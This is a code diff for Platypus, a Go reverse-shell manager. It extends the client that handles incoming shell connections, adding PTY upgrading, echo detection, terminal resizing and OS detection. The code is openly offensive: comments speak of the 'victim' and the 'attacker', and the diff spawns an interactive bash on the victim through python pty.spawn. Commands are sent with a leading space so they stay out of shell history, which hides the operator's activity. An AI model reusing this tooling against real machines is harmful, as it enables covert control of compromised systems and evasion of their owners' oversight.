@@ -17,6 +17,7 @@ import (
 	"github.com/WangYihang/Platypus/lib/util/str"
 	humanize "github.com/dustin/go-humanize"
 	"github.com/jedib0t/go-pretty/table"
+	"golang.org/x/term"
 )
 
 type OperatingSystem int
@@ -37,6 +38,7 @@ func (os OperatingSystem) String() string {
 type TCPClient struct {
 	conn              net.Conn
 	Interactive       bool
+	PtyEstablished    bool
 	GroupDispatch     bool              `json:"group_dispatch"`
 	Hash              string            `json:"hash"`
 	Host              string            `json:"host"`
@@ -48,8 +50,10 @@ type TCPClient struct {
 	Python2           string            `json:"python2"`
 	Python3           string            `json:"python3"`
 	TimeStamp         time.Time         `json:"timestamp"`
+	EchoEnabled       bool
 	readLock          *sync.Mutex
 	writeLock         *sync.Mutex
+	Interacting       *sync.Mutex
 	Mature            bool
 }
 
@@ -58,8 +62,10 @@ func CreateTCPClient(conn net.Conn) *TCPClient {
 	port, _ := strconv.Atoi(strings.Split(conn.RemoteAddr().String(), ":")[1])
 	return &TCPClient{
 		TimeStamp:         time.Now(),
+		EchoEnabled:       false,
 		conn:              conn,
 		Interactive:       false,
+		PtyEstablished:    false,
 		GroupDispatch:     false,
 		Hash:              "",
 		Host:              host,
@@ -72,6 +78,7 @@ func CreateTCPClient(conn net.Conn) *TCPClient {
 		User:              "",
 		readLock:          new(sync.Mutex),
 		writeLock:         new(sync.Mutex),
+		Interacting:       new(sync.Mutex),
 		Mature:            false,
 	}
 }
@@ -83,6 +90,38 @@ func (c *TCPClient) Close() {
 
 func (c *TCPClient) GetConnString() string {
 	return c.conn.RemoteAddr().String()
+}
+
+func (c *TCPClient) GetConn() net.Conn {
+	return c.conn
+}
+
+func (c *TCPClient) GetUsername() string {
+	var username string
+	if c.User == "" {
+		username = "unknown"
+	} else {
+		username = c.User
+	}
+	return username
+}
+
+func (c *TCPClient) GetPrompt() string {
+	if c.Alias != "" {
+		return fmt.Sprintf(
+			"[%s] (%s) %s [%s] » ",
+			c.Alias,
+			c.OS.String(),
+			c.GetConnString(),
+			c.GetUsername(),
+		)
+	}
+	return fmt.Sprintf(
+		"(%s) %s [%s] » ",
+		c.OS.String(),
+		c.GetConnString(),
+		c.GetUsername(),
+	)
 }
 
 func (c *TCPClient) AsTable() {
@@ -152,9 +191,8 @@ func (c *TCPClient) ReadUntilClean(token string) string {
 	inputBuffer := make([]byte, 1)
 	var outputBuffer bytes.Buffer
 	for {
-		c.readLock.Lock()
-		n, err := c.conn.Read(inputBuffer)
-		c.readLock.Unlock()
+		c.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
+		n, err := c.ReadConnLock(inputBuffer)
 		if err != nil {
 			log.Error("Read from client failed")
 			c.Interactive = false
@@ -167,21 +205,18 @@ func (c *TCPClient) ReadUntilClean(token string) string {
 			break
 		}
 	}
+	c.conn.SetReadDeadline(time.Time{})
 	// log.Debug("%d bytes read from client", len(outputBuffer.String()))
 	return outputBuffer.String()[:len(outputBuffer.String())-len(token)]
 }
 
 func (c *TCPClient) ReadUntil(token string) (string, bool) {
-	// Set read time out
-	c.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
-
 	inputBuffer := make([]byte, 1)
 	var outputBuffer bytes.Buffer
 	var isTimeout bool
 	for {
-		c.readLock.Lock()
-		n, err := c.conn.Read(inputBuffer)
-		c.readLock.Unlock()
+		c.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
+		n, err := c.ReadConnLock(inputBuffer)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				log.Error("Read response timeout from client")
@@ -200,19 +235,18 @@ func (c *TCPClient) ReadUntil(token string) (string, bool) {
 			break
 		}
 	}
+	c.conn.SetReadDeadline(time.Time{})
 	// log.Info("%d bytes read from client", len(outputBuffer.String()))
 	return outputBuffer.String(), isTimeout
 }
 
 func (c *TCPClient) ReadSize(size int) string {
-	c.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
 	readSize := 0
 	inputBuffer := make([]byte, 1)
 	var outputBuffer bytes.Buffer
 	for {
-		c.readLock.Lock()
-		n, err := c.conn.Read(inputBuffer)
-		c.readLock.Unlock()
+		c.conn.SetReadDeadline(time.Now().Add(time.Second * 3))
+		n, err := c.ReadConnLock(inputBuffer)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				log.Error("Read response timeout from client")
@@ -230,21 +264,19 @@ func (c *TCPClient) ReadSize(size int) string {
 			break
 		}
 	}
+	c.conn.SetReadDeadline(time.Time{})
 	// log.Info("(%d/%d) bytes read from client", len(outputBuffer.String()), size)
 	return outputBuffer.String()
 }
 
 func (c *TCPClient) Read(timeout time.Duration) (string, bool) {
-	// Set read time out
-	c.conn.SetReadDeadline(time.Now().Add(timeout))
-
 	inputBuffer := make([]byte, 0x400)
 	var outputBuffer bytes.Buffer
 	var isTimeout bool
 	for {
-		c.readLock.Lock()
-		n, err := c.conn.Read(inputBuffer)
-		c.readLock.Unlock()
+		// Set read time out
+		c.conn.SetReadDeadline(time.Now().Add(timeout))
+		n, err := c.ReadConnLock(inputBuffer)
 		if err != nil {
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				isTimeout = true
@@ -264,6 +296,58 @@ func (c *TCPClient) Read(timeout time.Duration) (string, bool) {
 	return outputBuffer.String(), isTimeout
 }
 
+func (c *TCPClient) ReadConnLock(b []byte) (int, error) {
+	c.readLock.Lock()
+	n, err := c.conn.Read(b)
+	c.readLock.Unlock()
+	if err == nil {
+		// fmt.Println("<<<", n, string(b[0:n]))
+	}
+	return n, err
+}
+
+func (c *TCPClient) TryReadEcho(echo string) (bool, string) {
+	// Check whether the client enable terminal echo
+	inputBuffer := make([]byte, 1)
+	var outputBuffer bytes.Buffer
+	var EchoEnabled bool = true
+
+	// Clean all prompt
+	// eg: `root@root:/root# `
+	c.Read(time.Second * 1)
+
+	// Ping
+	c.Write([]byte(echo + "\n"))
+
+	// Read pong and check the echo
+	for _, ch := range echo {
+		// Set read time out
+		c.conn.SetReadDeadline(time.Now().Add(time.Second * 1))
+		n, err := c.ReadConnLock(inputBuffer)
+		// fmt.Println(string(inputBuffer), string(ch))
+		if err == nil {
+			outputBuffer.Write(inputBuffer[:n])
+			if byte(ch) != inputBuffer[0] {
+				EchoEnabled = false
+				break
+			}
+		} else {
+			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
+				EchoEnabled = false
+			} else {
+				log.Error("Read from client failed")
+				c.Interactive = false
+				Ctx.DeleteTCPClient(c)
+			}
+			break
+		}
+	}
+
+	// fmt.Println("EchoEnabled: ", EchoEnabled)
+	// Return EchoEnabled and misread data (when EchoEnabled is false)
+	return EchoEnabled, outputBuffer.String()
+}
+
 func (c *TCPClient) Write(data []byte) int {
 	c.writeLock.Lock()
 	n, err := c.conn.Write(data)
@@ -272,6 +356,8 @@ func (c *TCPClient) Write(data []byte) int {
 		log.Error("Write to client failed")
 		c.Interactive = false
 		Ctx.DeleteTCPClient(c)
+	} else {
+		// fmt.Println(">>>", n, string(data[0:n]))
 	}
 	log.Debug("%d bytes sent to client", n)
 	return n
@@ -441,7 +527,58 @@ func (c *TCPClient) FileExists(path string) (bool, error) {
 func (c *TCPClient) System(command string) {
 	// https://www.technovelty.org/linux/skipping-bash-history-for-command-lines-starting-with-space.html
 	// Make bash not store command history
-	c.conn.Write([]byte(" " + command + "\n"))
+	c.Write([]byte(" " + command + "\n"))
+}
+
+func (c *TCPClient) SetWindowSize(ws *WindowSize) {
+	// BUG: Require in shell mode, (if in interactive mode, this call will fail)
+	commands := []string{
+		fmt.Sprintf("stty rows %d columns %d", ws.Rows, ws.Columns),
+	}
+	log.Info("Resetting Windows Size to: %d, %d", ws.Rows, ws.Columns)
+	for _, command := range commands {
+		c.SystemToken(command)
+	}
+}
+
+func (c *TCPClient) EstablishPTY() error {
+	if c.PtyEstablished {
+		return errors.New("PTY is already established in the current client")
+	}
+
+	if c.OS == Windows {
+		return errors.New("Fully interactive PTY on Windows client is not supported")
+	}
+
+	python := c.SelectPython()
+	if python == "" {
+		return errors.New("Fully interactive PTY require Python on the current client")
+	}
+
+	// Step 1: Spawn /bin/sh via pty of victim
+	command := "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+	log.Info("spawning /bin/bash on the current client")
+	c.System(command)
+
+	// TODO: Check whether pty is established
+	c.PtyEstablished = true
+
+	// Step 2: Get attacker pty window size
+	width, height, _ := term.GetSize(int(os.Stdin.Fd()))
+	log.Info("attcker window size: (%d, %d)", width, height)
+
+	// Step 3: Reset victim window size to fit attacker window size
+	log.Info("reseting client terminal...")
+	c.System("reset")
+	log.Info("reseting client SHELL...")
+	c.System("export SHELL=bash")
+	log.Info("reseting client TERM colors...")
+	c.System("export TERM=xterm-256color")
+	log.Info("reseting client window size...")
+	c.System(fmt.Sprintf("stty rows %d columns %d", height, width))
+
+	// TODO: Check pty establish status
+	return nil
 }
 
 func (c *TCPClient) SystemToken(command string) string {
@@ -461,6 +598,12 @@ func (c *TCPClient) SystemToken(command string) string {
 	}
 
 	c.System(input)
+
+	if c.EchoEnabled {
+		// TODO: test restful api, execute system
+		// Read Pty Echo as junk
+		c.ReadUntil(tokenB)
+	}
 
 	var isTimeout bool
 	if c.OS == Windows {
@@ -559,10 +702,18 @@ func (c *TCPClient) DetectNetworkInterfaces() {
 }
 
 func (c *TCPClient) DetectOS() {
-	token := str.RandomString(0x08)
+	tokenA := str.RandomString(0x08)
+	tokenB := str.RandomString(0x08)
 	// For Unix-Like OSs
-	c.System(fmt.Sprintf("uname ; echo %s", token))
-	output, _ := c.ReadUntil(token)
+	command := fmt.Sprintf("echo %s; uname ; echo %s", tokenA, tokenB)
+	c.System(command)
+
+	if c.EchoEnabled {
+		// Read echo
+		c.ReadUntil(tokenB)
+		c.ReadUntil(tokenA)
+	}
+	output, _ := c.ReadUntil(tokenB)
 
 	kwos := map[string]OperatingSystem{
 		"linux":   Linux,
@@ -579,8 +730,14 @@ func (c *TCPClient) DetectOS() {
 	}
 
 	// For Windows
-	c.System(fmt.Sprintf("ver & echo %s", token))
-	output, _ = c.ReadUntil(token)
+	c.System(fmt.Sprintf("echo %s & ver & echo %s", tokenA, tokenB))
+
+	if c.EchoEnabled {
+		// Read echo
+		c.ReadUntil(tokenB)
+		c.ReadUntil(tokenA)
+	}
+	output, _ = c.ReadUntil(tokenB)
 	if strings.Contains(strings.ToLower(output), "windows") {
 		c.OS = Windows
 		log.Debug("[%s] OS detected: %s", c.conn.RemoteAddr().String(), c.OS.String())
@@ -588,6 +745,6 @@ func (c *TCPClient) DetectOS() {
 	}
 
 	// Unknown OS
-	log.Error("[%s] OS detection failed, set [%s] to `Unknown`", c.conn.RemoteAddr().String(), c.Hash)
+	log.Error("[%s] OS detection failed, set OS = `Unknown`", c.conn.RemoteAddr().String())
 	c.OS = Unknown
 }
